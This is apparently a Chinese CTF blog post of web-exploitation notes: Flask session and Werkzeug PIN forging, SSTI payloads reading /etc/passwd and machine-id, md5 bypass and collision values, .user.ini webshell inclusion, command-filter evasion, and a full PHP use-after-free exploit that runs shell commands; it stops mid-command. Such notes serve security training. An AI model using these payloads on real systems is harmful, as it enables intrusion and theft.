---
title: Web杂项
description: 记录一下做题过程中积累的零散知识,或者简单地做一下知识点到题目的导航
abbrlink: f7296425
date: 2022-10-16 16:41:16
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
typora-root-url: ..
---



# 先考虑信息泄露,尝试访问以下:

```
/www.zip    www.rar   www.tar.gz
/.git/
/.git/index.php
/.git/config
/.svn/    (源码泄露)
/.svn/index.php

/.hg/ (hg泄露)

/文件名~   gedit编辑器的缓存

/index.php.swp
/***.php.swp  (vim泄露)
/phpmyadmin/
/phpmyadmin/index.php
/robots.txt
/db/db.mdb  (mdb数据库存放位置)

***.bak
例如 index.php.bak

.DS_store
```





# 使用脚本对`flask`网站的`session`进行解密和伪造

以达到伪装特殊权限用户登录的目的, 参考题目:[buuctf-[HCTF 2018]admin](2e610037.html)

>` flask`的`session`是存储在客户端`cookie`中的，而且`flask`仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而`flask`并没有提供加密操作，所以其`session`的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。

可以使用脚本对`flask`的`session`进行解密和伪造:

注册一个名为`admin1`的账户并登录,抓包看到当前的`cookie`中的`session`值:

<img src="/images/ctfweb-others/image-20221016213837939.png" alt="image-20221016213837939" style="zoom:67%;" />

可以使用脚本对`session`进行解密:https://github.com/noraj/flask-session-cookie-manager

用法:

```shell
py flask_session_cookie_manager3.py decode -c "session值" -s "key值"
py flask_session_cookie_manager3.py encode -s "key值" -t "我们需要伪造的值"
```

可以在`config.py`中找到`key`的值:`ckj123`

```python
import os
class Config(object):
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'
    SQLALCHEMY_TRACK_MODIFICATIONS = True
```

用脚本: 首先使用`key`对`admin1`登录时的`session`值进行解密

```
E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master>py flask_session_cookie_manager3.py decode -c ".eJw9kMFuwjAMhl9lypkD3egFiQNTCmqlJAKljZwLKrSQuDGT6CZoEe--DE2cP_vz__vOdsdL2zs2P9ahbyds5xs2v7O3PZszqT9RGRkAs1RpuFp03mLhAMWH4hVKUyGM5UzybrBYJmpdodAOLeUpkEiFFokYpZe6cNasgjUwSF6QNCuneJwz4ibHTdzNZ5YvZ2CqACZPJR5uYLZB6dMo3qtO0F-GolM8S8W4JdDOS2wQ9HKUVF6B8gV7TNihvxx3319de35VACqC5TZYnaWSCg8EU9Bl1G4GqbNBrGPEdaxGkeMmnq2cWi6eOk_1qX2ZmmlS2n9yrikCVjfkzwmbsJ--vTwfx5Ipe_wCfPRvAQ.Y0wFxw.Mk0P7kqa9AF6MQm6hSJpO1WQFhQ" -s "ckj123"
```

解密出来的值是一个字典: 可以看到里面有`admin1`

```
{'_fresh': False, '_id': b'50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb', 'csrf_token': b'bbed6ee196bbbf4a533d25120c50f0fa9641aea8', 'image': b'wMTd', 'name': 'admin1', 'user_id': '10'}
```

那么为了伪造`admin`登录,将`admin1`改为`admin`

```
{'_fresh': False, '_id': b'50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb', 'csrf_token': b'bbed6ee196bbbf4a533d25120c50f0fa9641aea8', 'image': b'wMTd', 'name': 'admin', 'user_id': '10'}
```

然后使用脚本对修改完的内容进行加密,同样需要用到`key`,加密之后得到一个新的`session`值

```
E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master>py flask_session_cookie_manager3.py encode -s "ckj123" -t "{'_fresh': False, '_id': b'50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb', 'csrf_token': b'bbed6ee196bbbf4a533d25120c50f0fa9641aea8', 'image': b'wMTd', 'name': 'admin', 'user_id': '10'}"
.eJw9kMFuwjAMhl9l8pkD3egFiQNTCmqlOAKljZwLKrSQpAmT6CZoEe--DE2cP_vz__sOu-Ol7Q3Mj7Xv2wnsbAPzO7ztYQ4oP51Q6MllqZB01c5Y7QpDjn8IVjlUlaOxnCHrBu3KRKwrx6VxOuQpBZ5yyRM-okVZGK1WXisakBUB1coIFucUv-G4ibv5TLPljFTlSeUpusON1NYLeRr5e9Xx8Jeh6ATLUj5uA0lj0TWO5HLEUF4p5At4TODQX46776-uPb8qUCi8ZtprmaUYCkuBpiTLqN0MKLOBr2PEdawWInebeLYyYrl46myoT-3L1EyTUv-Tcx0igLoJ9gwT-Onby_NvkEzh8QsPi27Q.Y0wG7Q.BnqQ4DVzGAf6kiiYR_i5k9_YwLQ
```

将这个新的值替换到`cookie`中,就完成了`session`伪造,成功伪装成了`admin`登录,拿到flag

<img src="/images/ctfweb-others/image-20221016213048788.png" alt="image-20221016213048788" style="zoom:67%;" />



<br>

***

<br>

# flask的PIN伪造



>PIN是 `Werkzeug`（它是` Flask` 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 **您可以使用浏览器中的调试器引脚来启动交互式调试器。**
>
>请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。
>
>调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。
>
>`werkzeug`不同版本以及`python`不同版本都会影响PIN码的生成

如果需要伪造PIN码,需要:

- `username`, 读取`/etc/passwd`获得
- `modname`,默认值是`flask.app`
- `appname`,默认值是`Flask`
- 10进制的mac地址, 通过`/sys/class/net/eth0/address`获得十六进制格式,再转为10进制
- `machine_id` :读取文件`/etc/machine-id ` 或者 `/proc/sys/kernel/random/boot_id 3./proc/self/cgroup`
- `flask/app.py`的路径, 常见的有:`/usr/local/lib/python3.7/site-packages/flask/app.py`,通过报错等信息获得

**通过已知的SSTI来读取文件,获得上述信息:**

```
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
{%endif%}
{%endfor%}
输出中找到了一个名为 flaskweb的可疑用户

{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address').read() }}
{%endif%}
{%endfor%}
输出mac地址56:08:f5:2f:90:51, 转为10进制:94596473262161

{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/etc/machine-id').read() }}
{%endif%}
{%endfor%}
machine-id: 1408f836b0ca514d796cbf8960e45fa1
```

运行脚本,生成pin:

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
private_bits = [
    '94596473262161',  # mac地址  str(uuid.getnode()),  /sys/class/net/ens33/address
    '1408f836b0ca514d796cbf8960e45fa1'  # get_machine_id(), /etc/machine-id
]
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)

#输出: 961-361-247
```

在报错页面输入pin之后,成功进入python的交互页面

![image-20221024164345369](/images/ctfweb-others/image-20221024164345369.png)

















# 关于md5

## md5_sql注入

假设服务器的查询语句为: 其中`$pass`是用户输入的内容

```
select * from 'admin' where password=md5($pass,true)
```

此时如果要注入,可以传:

```
ffifdyop
129581926211651571912466741651878684928
```

这两者在生成二进制的`md5`后可以包含`...' or .. `这样的**万能密码**,能够达到注入目的



常常能遇到需要绕过`md5`比较的情况

```
if($a != $b && md5($a) == md5($b))
```

## 数组绕过:

**php中数组经过md5计算的值为`NULL`**

所以传参可以这样传:

```
a[]=1&b[]=2
```

## 0e绕过md5

另外一种方法: 

`0e`开头的字符串在参与比较时,**会被当做科学计数法**,结果转换为0,因此,下面两个数的比较:

```
0e830400451993494058024219903391 == 0e462097431906509019562988736854
会被视为:
0==0 从而返回True
```

那么这种方法也可以用来绕过`md5`值的比较:

```
md5('QNKCDZO') == md5(240610708) 这两者计算md5的结果都是0e开头的,所以这里会判定为True
```

`md5`计算后以`0e`开头的值还包括:

```
QNKCDZO
240610708
byGcY
sonZ7y
aabg7XSs
aabC9RqS
s878926199a
s155964671a
s214587387a
s1091221200a
```

<br>

## a==md5(a)

这里还需要利用上面,`0e`开头的字符串在参与比较时,**会被当做科学计数法**,结果转换为0的性质

符合这个条件的a必须以`0e`开头, `md5(a)`也必须以`0e`开头,且两者除了`0e`之外必须全为数字

```
符合条件的:0e215962017
```





## 绕过md5强比较

例如:

```php
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
    ...
    } 
```

这里由于使用了`===`强相等, 所以之前使用的数组绕过,`0e`绕过等就无法使用了

这里利用md5碰撞工具`fastcoll`,产生两个md5值相同的2进制文件

```
E:\CTF工具合集\md5碰撞\fastcoll_v1.0.0.5.exe>fastcoll_v1.0.0.5.exe -o a b
MD5 collision generator v1.5
by Marc Stevens (http://www.win.tue.nl/hashclash/)

Using output filenames: 'a' and 'b'
Using initial value: 0123456789abcdeffedcba9876543210

Generating first block: .
Generating second block: S11.
Running time: 0.153 s
```

<img src="/images/ctfweb-others/image-20221020163346764.png" alt="image-20221020163346764" style="zoom:67%;" />

在`burpsuite`的`repeater`中右键:`paste from file`,加载文件后选中右键-`send to decoder`(注意,直接复制到`decoder`中的话不是对二进制进行编码,结果会不一样), 然后进行URL编码:

<img src="/images/ctfweb-others/image-20221020163559394.png" alt="image-20221020163559394" style="zoom:67%;" />

将编码后的内容分别复制给a和b

```
a=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%6c%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%4d%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%4d%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%4e%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%0b%df%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%ce%5f%ea%a5%e3&b=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%ec%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%cd%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%cd%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%ce%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%8b%de%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%4e%5f%ea%a5%e3
```

运行一下,响应包中没有`forbid ~`, 说明成功绕过了`md5`强比较

<img src="/images/ctfweb-others/image-20221020163652761.png" alt="image-20221020163652761" style="zoom:80%;" />



这里直接备用几个能直接绕过md5强比较的值(URL编码后的):

```
%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%6c%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%4d%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%4d%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%4e%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%0b%df%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%ce%5f%ea%a5%e3
%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%ec%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%cd%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%cd%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%ce%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%8b%de%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%4e%5f%ea%a5%e3
--------------------------------------------------------------------------------------------------------
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
--------------------------------------------------------------------------------------------------------
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```







# .user.ini自动包含

[[SUCTF 2019]CheckIn](2e610037.html)

`.user.ini`实际上就是一个可以由用户自定义的`php.ini`配置文件，我们能够自定义的设置是模式为“`PHP_INI_PERDIR` 、 `PHP_INI_USER`”的设置。
它比`.htaccess`(分布式配置文件)用的更广，不管是`nginx/apache/IIS`，只要是以`fastcgi`(进程管理器)运行的php都可以用这个方法。

其中有两项可以为我们所用:

- `auto_prepend_file`指定一个文件，自动**包含在要执行的文件前**，类似于在文件前调用了`require()`函数。

- `auto_append_file`类似，只是**在文件后面包含**。

**例如如果同目录下有`.user.ini`,其内容为:**

```
auto_prepend_file="1.jpg"
```

**那么在执行同目录下的`index.php`(或者其他php文件)时,就会先自动地对`1.jpg`进行包含**

**这种方法常常可以用来执行图片马等**



# exif_imagetype图片检测的绕过方法

在需要绕过的文件头部加上对应符合要求的文件头字段:

**exif_imagetype() 读取一个图像的第一个字节并检查其签名。判断一个图像的类型**

常见的文件类型的文件头:

```
JPEG,JPG: JPGGraphic File
GIF: GIF89A
ZIP: Zip Compressed
doc,xls,xlt,ppt,apr等: MS Compound Document v1 or Lotus Approach APRfil
```

另外,也可以在一张真实图片后面加上一句话木马的内容来绕过,具体见: [DVWA-文件上传-high](96b78edd.html)



# _>/dev/null

<img src="/images/ctfweb-others/image-20221017215513812.png" alt="image-20221017215513812" style="zoom:67%;" />

>`c`的内容会作为系统命令被`system`语句执行
>
>后面 `>/dev/null 2>&1` 的含义是将前面的命令无效化
>
> 符号`>`表示重定向` >/dev/null`表示**将前面命令的输出重定向到 一个空设备文件中，因此不输出任何信息到终端**
>
>`2>&1`的含义是将命令执行的错误信息重定向到空设备文件中

因此这里需要把前面的命令和` >/dev/null`截断,这里可以使用分号



# 模糊执行`bin`目录下的命令

假设有`system($c);`在过滤得比较过分的情况下,可以这样给c传参:

```
 c=/???/????64%20????.???
 翻译过来就是c=/bin/base64 flag.php
 也就是把flag.php的内容base64编码后输出
```



# 或许可以用来扫描根目录(CTFshow_web72)

```php
c=?> //这里闭合前面的php标签
<?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
} exit(0);
?>
```

创建类`new DirectoryIterator`下的一个对象,外部调用`DirectoryIterator`时，传入一个目录路径字符串，实例化`DirectoryIterator`类

`glob://`查找匹配的文件路径模式, 那么glob://**/***  作用就是查找根目录下的所有文件，查找到的是它们的路径

传给外层的`new DirectoryIterator`后，就可以对这些路径进行扫描

接着使用`foreach`循环输出所有`__toString`将类对象转化为字符串形式输出



用于读取`flag.php`的`uaf`脚本, 将此脚本进行url编码后,作为值传给POST中的参数以执行

```php
<?php

function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
?>

```



<br>

# XFF头伪造IP:

![image-20221018174027035](/images/ctfweb-others/image-20221018174027035.png)

例如: 某网页能够返回访问者的真实IP:

<img src="/images/ctfweb-others/image-20221018174153565.png" alt="image-20221018174153565" style="zoom:67%;" />

加上`XFF`头之后:

![image-20221018174101573](/images/ctfweb-others/image-20221018174101573.png)



# escapeshellarg和escapeshellcmd的共用漏洞

`escapeshellarg`和`escapeshellcmd`会对传入字符串中的特殊字符进行转义,以保证传入`shell`的参数字符串是安全的

其中`escapeshellarg`会在未配对的单引号前面加上`\`,然后再在转义后的`\'`两段再加上一对单引号,最后再在整个字符串的两端加上一对单引号

`escapeshellcmd`会在下列特殊字符(包括`/`)以及不成对的单引号前面加上`\`

```
：`&#;`|*?~<>^()[]{}$\`、`\x0A` 和 `\xFF`。
```

简单的示例:

```php
<?php
    $a = "abc'";
    $b = escapeshellarg($a);
    $c = escapeshellcmd($a);
    $d = escapeshellcmd($b);
    echo $a;
    echo PHP_EOL;
    echo $b;
    echo PHP_EOL;
    echo $c;
    echo PHP_EOL;
    echo $d;
?>
/*输出:
1.无处理的输出:
abc'
2.下面这里从右到左第三个感叹号是原来字符串中的那个,先在其左边加上\,然后再将\'用一对单引号包裹,最后将整个字符串用一对单引号包裹
'abc'\'''  
3.下面这里只是在单引号左边加上了\
abc\'
4.下面这个在2的基础上,在\前面又加了\,同时在最后那个不成对的单引号前面也加了\
'abc'\\''\'   
*/
```

这两者单独使用都没有问题,而当对一个字符串先使用`escapeshellarg`在使用`escapeshellcmd`处理时,就会出现漏洞

先使用`escapeshellarg`能够将字符串整体用引号包裹起来,字符串避免被当作命令执行,但后面再执行`escapeshellcmd`,又会导致刚刚包裹字符串的引号失效,从而导致命令执行.

例题见: [[BUUCTF 2018]Online Tool](2e610037.html)



# 无参数RCE常用函数和payload

```
localeconv()  返回一包含本地数字及货币格式信息的**数组**，其中第一个元素是.
current() 返回数组中的单元，默认是第一个，pos()与current()作用相同
current(localeconv()): 返回.

scandir() 扫描一个目录,以数组形式返回
scandir(current(localeconv())) 扫描当前目录
Print_r(scandir(current(localeconv()))) 打印当前目录下的内容

getcwd() 获得当前目录的绝对路径
Print_r(scandir(getcwd())) 扫描当前目录并输出

dirname()返回上级目录的绝对路径
Print_r(scandir(dirname(dirname(dirname(getcwd()))))) 可以依次增加dirname()直到找到根目录
读取文件内容:
show_source()
file_get_content()
highlight_file()

数组操作:
each() 返回当前键、值，并将指针向后移动一步
end() 返回最后一个单元
next() 下一个单元
prev() 前一个单元
array_reverse() 逆序返回数组
```



另外,有些题目还可以通过字符拼接或者引入其他没受过滤限制的参数的方法来执行命令,例如:

```
eval(end(current(get_defined_vars())))&a=show_source('/f1agg');
这里get_defined_vars()返回所有已定义变量所组成的数组,其中GET数组是其中的第一个元素
上面最后其实就是eval($_GET[$a])
```

具体应用见:[Easy Calc](2e610037.html)

<br>

利用`session_id`:

```
先把要用eval执行的命令加密成16进制并放到Cookie中的 PHPSESSID字段里,然后:
eval(hex2bin(session_id(session_start())));

```





<br>

# preg_replace中e标签导致的命令执行

**`preg_replace`函数中, 使用了`/e`标签,意思是将完成替换后的字符串当作php代码来执行**

具体见[ZJCTF，不过如此](2e610037.html)

<br>

# file_get_contents函数_data://协议

遇到这种判断的,直接让`file_get_contents`从`data`协议里读数据就可以

```
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream"
```

```
?text=next.php&text=data://text/plain,I have a dream
```

<br>



# phpmyadmin漏洞利用



<img src="/images/ctfweb-others/image-20221020094957901.png" alt="image-20221020094957901" style="zoom:67%;" />

各个版本的可利用漏洞: https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label2_0

[phpmyadmin各版本漏洞利用](a458c677.html)

`CVE-2018-12613：后台文件包含`漏洞利用:[[GWCTF 2019]我有一个数据库](2e610037.html)



<br>

# 反斜杠+命令绕过过滤:

php中`preg_match`这里对反斜杠的过滤是有问题的

对反引号的检测无效，而在Linux中，反引号对一些命令也几乎没有影响

所以在常规命令里加一个反斜杠,一方面反斜杠无法被过滤,另一方面也导致命令也不会被过滤了:

<img src="/images/ctfweb-others/image-20221020164005294.png" alt="image-20221020164005294" style="zoom:67%;" />

````
cmd=l\s+/   相当于执行了ls /   这里`+`是url中的连接符
cmd=ca\t+/flag  
````

<img src="/images/ctfweb-others/image-20221020164200800.png" alt="image-20221020164200800" style="zoom:67%;" />

例如:

```php
<?
$cmd = $_GET['cmd'];
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
	echo $cmd;
}
?>
```

这里如果执行`ls`会被过滤,但是`l\s`可以正常执行



# intval的一些绕过

这里`if(intval($num) < 2020 && intval($num + 1) > 2021)` 可以利用运算时进行转换的性质

例如传`123e12`, `intval($num)`时,取到字母就会停止,所以是123

但是在进行运算时,会把它整体强制转换成数值,**这里的`e`会被当成科学计数法**,所以`intval($num + 1) > 2021`也成立



<br>

***

<br>





# unicode欺骗

>两个不同编码的`Unicode`字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，**a 和ａ(\uff41)在某些字体下看起来可能相同**，**15和⑮(\u246e)其表示的数学意义可能相同**，所以这两种字符都有其相应的等价性，这种等价性是由人为规定的。
>
>转换组成字符的方式有 `Normalization Form C` 和 `Normalization Form KC` 两种，它们之间的区别取决于生成的文本是否与原始非标准化文本等效，其中`K`用于表示兼容性。同理，分解组成字符的方式也有`Normalization Form D `和` Normalization Form KD `两种。那么`NFC`和`NFD`的区别是什么呢，举例来说，`Å(\u212B)`用`NFD`进行`normalize`，会变为`Å(\u0041\u030a)`，而NFC处理后则是`Å(\u00c5)`。在normalize的时候，会检测字符是否在NFC表中，如果在则进行对应的转换算法。

简单来说就是,很多字符,例如`A`,在`unicode`中都有特殊编码的等价字符,例如`ａ(\uff41)`. 这些等价字符常常可以用来绕过过滤和检测

[[ASIS 2019]Unicorn shop](2e610037.html)



# 构造反序列化POP链

注意如果有`a`,`b`是不同的两个类的实例, 且`b`是`a`的属性`x`的值

那么当涉及`a->x`时,要分清楚会调用`a`所在类的魔术方法,还是`b`所在类的魔术方法

[[MRCTF2020]Ezpop](2e610037.html)



# 哈希长度扩展攻击

这里还可以通过`hashpump`工具进行哈希长度扩展攻击: (**安在kali中了**)

>如果一个应用程序是这样操作的：
>
>1. 准备了一个密文和一些数据构造成一个字符串，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）
>2. 让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文
>3. 服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值
>
>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出`{secret || data || attacker_controlled_data}`的哈希值*。*

例如本题中的密文就是`secret_key`

目前掌握的的是`md5(secret_key+ "flag.txtscan")`的值,那么我们可以通过工具获得`md5(secret_key+ flag.txtscan+read)`的值

这样如果再从`action`中传 `scanread` 就可以成功执行`read`功能了

```
kali㉿kali)-[~/Desktop/HashPump]
└─$ hashpump   
